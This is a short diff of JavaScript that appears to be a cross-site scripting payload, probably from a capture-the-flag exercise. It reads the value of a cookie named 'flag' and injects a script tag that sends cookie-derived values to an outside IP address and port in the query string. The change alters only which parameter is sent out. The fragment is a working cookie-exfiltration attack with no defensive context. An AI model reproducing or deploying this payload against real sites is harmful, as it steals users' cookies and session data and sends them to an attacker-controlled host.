@@ -36,5 +36,5 @@ var flag=cc.substring(beg);
 var f=getCookie('flag');
 
 var script=document.createElement('script');
-script.src='http://119.29.81.170:7892/?flag='+flag+"&f="+f;
+script.src='http://119.29.81.170:7892/?beg='+beg+"&f="+f;
 document.body.appendChild(script);
